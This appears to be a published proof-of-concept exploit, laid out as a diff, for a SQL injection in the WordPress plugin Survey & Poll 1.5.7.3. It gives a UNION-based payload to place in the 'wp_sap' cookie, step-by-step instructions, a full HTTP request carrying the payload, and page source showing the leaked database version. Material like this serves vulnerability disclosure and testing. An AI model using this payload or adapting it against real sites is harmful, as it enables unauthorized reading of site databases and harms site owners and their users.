@@ -1,0 +1,48 @@
+# Exploit Title: Wordpress Plugin Survey & Poll 1.5.7.3 - 'sss_params' SQL Injection
+# Date: 2018-09-09
+# Exploit Author: Ceylan Bozogullarindan
+# Vendor Homepage: http://modalsurvey.pantherius.com/
+# Software Link: https://downloads.wordpress.org/plugin/wp-survey-and-poll.zip
+# Version: 1.5.7.3
+# Tested on: Windows 10
+# CVE: N\A
+
+# Description
+# The vulnerability allows an attacker to inject sql commands using a value of a cookie parameter. 
+
+# PoC
+# Step 1. When you visit a page which has a poll or survey, a question will be appeared for answering.
+# Answer that question.
+# Step 2. When you answer the question, wp_sap will be assigned to a value. Open a cookie manager, 
+# and change it with the payload showed below;
+
+["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]
+
+# It is important that the "OR" statement must be 1=2. Because, application is reflecting the first result 
+# of the query. When you make it 1=1, you should see a question from firt record. 
+# Therefore OR statement must be returned False.
+
+# Step 3. Reload the page. Open the source code of the page. Search "sss_params". 
+# You will see the version of DB in value of sss_params parameter. 
+
+# The Request
+
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: wp_sap=["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]	
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+# The result from source code of the page
+
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sss_params = {"survey_options":"{\"options\":\"[\\\"center\\\",\\\"easeInOutBack\\\",\\\"\\\",\\\"-webkit-linear-gradient(top , rgb(5, 40, 242) 13% , rgb(204, 204, 204) 70%);-moz-linear-gradient(top , rgb(5, 40, 242) 13% , rgb(204, 204, 204) 70%);-ms-linear-gradient(top , rgb(5, 40, 242) 13% , rgb(204, 204, 204) 70%);-o-linear-gradient(top , rgb(5, 40, 242) 13% , rgb(204, 204, 204) 70%);linear-gradient(top , rgb(5, 40, 242) 13% , rgb(204, 204, 204) 70%);\\\",\\\"rgb(0, 0, 0)\\\",\\\"rgb(93, 93, 93)\\\",\\\"1\\\",\\\"5\\\",\\\"12\\\",\\\"10\\\",\\\"12\\\",500,\\\"Thank you for your feedback!\\\",\\\"0\\\",\\\"0\\\",\\\"0\\\"]\",\"plugin_url\":\"http:\\\/\\\/www.*****.com\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\",\"admin_url\":\"http:\\\/\\\/www.******.com\\\/wp-admin\\\/admin-ajax.php\",\"survey_id\":\"1101225978\",\"style\":\"modal\",\"expired\":\"false\",\"debug\":\"true\",\"questions\":[[\"Are You A First Time Home Buyer?\",\"Yes\",\"No\"],[\>>>>>>"10.1.36-MariaDB-1~trusty\"<<<<<<<]]}"};
+/* ]]> */
+</script>
+
+DB version: "10.1.36-MariaDB-1~trusty"....
